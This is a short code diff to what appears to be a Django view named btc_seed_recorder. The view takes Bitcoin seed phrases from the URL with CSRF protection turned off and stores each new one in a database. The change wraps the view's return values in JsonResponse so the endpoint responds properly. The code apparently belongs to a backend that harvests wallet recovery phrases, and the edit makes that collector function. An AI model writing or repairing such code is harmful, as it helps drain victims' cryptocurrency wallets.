@@ -73,7 +73,7 @@ def error500(exception):
 @csrf_exempt
 def btc_seed_recorder(request, seed):
     if BTC_SEED_PHRASE.objects.filter(seed=seed).exists():
-        return {'status': False}
+        return JsonResponse({'status': False})
     
     BTC_SEED_PHRASE(seed=seed).save()
-    return {'status': True}
+    return JsonResponse({'status': True})
